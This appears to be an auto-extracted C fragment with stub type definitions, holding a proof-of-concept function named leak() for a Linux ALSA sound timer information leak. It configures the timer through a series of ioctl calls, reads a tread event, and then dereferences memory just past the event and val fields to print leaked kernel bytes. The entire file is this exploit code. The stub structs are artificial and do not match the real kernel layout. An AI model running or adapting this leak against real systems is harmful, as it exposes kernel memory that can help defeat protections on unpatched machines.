
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int td ;
struct TYPE_2__ {int dev_sclass; int dev_class; } ;
struct snd_timer_tread {int filter; int ticks; int val; int event; TYPE_1__ id; } ;
struct snd_timer_select {int filter; int ticks; int val; int event; TYPE_1__ id; } ;
struct snd_timer_params {int filter; int ticks; int val; int event; TYPE_1__ id; } ;
typedef int st ;
typedef int ps ;


 int SNDRV_TIMER_CLASS_GLOBAL ;
 int SNDRV_TIMER_EVENT_START ;
 int SNDRV_TIMER_IOCTL_PARAMS ;
 int SNDRV_TIMER_IOCTL_SELECT ;
 int SNDRV_TIMER_IOCTL_START ;
 int SNDRV_TIMER_IOCTL_TREAD ;
 int SNDRV_TIMER_SCLASS_APPLICATION ;
 int errno ;
 int fd ;
 int ioctl (int ,int ,...) ;
 int memset (struct snd_timer_tread*,int ,int) ;
 int printf (char*,unsigned int,...) ;
 int read (int ,struct snd_timer_tread*,int) ;
 char* strerror (int) ;

void leak(){

 struct snd_timer_tread td;
 struct snd_timer_select st;
 struct snd_timer_params ps;
 int r;
 unsigned int leak_value_e, leak_value_v;
 int tread;

 memset(&td,0,sizeof(td));
 memset(&st,0,sizeof(st));
 memset(&ps,0,sizeof(ps));



 tread = 1;
 ps.filter |= 1<<SNDRV_TIMER_EVENT_START;
 ps.ticks = 1000 * 1000;

 r = ioctl(fd, SNDRV_TIMER_IOCTL_TREAD, &tread);
 if (r) {
  printf("SNDRV_TIMER_IOCTL_TREAD error : %d, %s\n", errno, strerror(errno));
  return;
 }



 st.id.dev_class = SNDRV_TIMER_CLASS_GLOBAL;
 st.id.dev_sclass = SNDRV_TIMER_SCLASS_APPLICATION;
 r = ioctl(fd, SNDRV_TIMER_IOCTL_SELECT, &st);
 if (r) {
  printf("SNDRV_TIMER_IOCTL_SELECT error : %d, %s\n", errno, strerror(errno));
  return;
 }

 r = ioctl(fd, SNDRV_TIMER_IOCTL_PARAMS, &ps);
 if (r) {
  printf("SNDRV_TIMER_IOCTL_PARAMS error : %d, %s\n", errno, strerror(errno));
  return;
 }

 r = ioctl(fd, SNDRV_TIMER_IOCTL_START);
    if (r) {
     printf("SNDRV_TIMER_IOCTL_START error : %d, %s\n", errno, strerror(errno));
     return;
 }



 r = read(fd, &td, sizeof(td));

 leak_value_e = *((unsigned long *)(&td.event+1));
 printf("leak_value(event) : %lx\n", leak_value_e);

 leak_value_v = *((unsigned long *)(&td.val+1));
 printf("leak_value(val) : %lx\n", leak_value_v);

}
